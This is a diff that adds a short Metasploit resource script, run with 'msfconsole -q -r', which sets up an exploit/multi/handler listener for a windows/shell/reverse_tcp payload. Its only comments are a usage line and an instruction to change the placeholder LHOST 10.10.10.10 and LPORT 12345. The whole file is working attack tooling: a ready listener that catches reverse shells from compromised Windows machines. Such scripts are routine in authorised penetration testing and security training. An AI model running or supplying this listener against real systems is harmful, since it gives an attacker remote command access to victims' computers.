@@ -1,0 +1,14 @@
+#####
+##### Creates quick multi-handler in metasploit
+##### Invoke with "msfconsole -q -r {this_file}"
+#####
+
+use exploit/multi/handler
+set PAYLOAD windows/shell/reverse_tcp
+
+#####
+##### CHANGE THE BELOW VALUES TO MATCH YOUR NEEDS #####
+#####
+set LHOST 10.10.10.10
+set LPORT 12345
+exploit
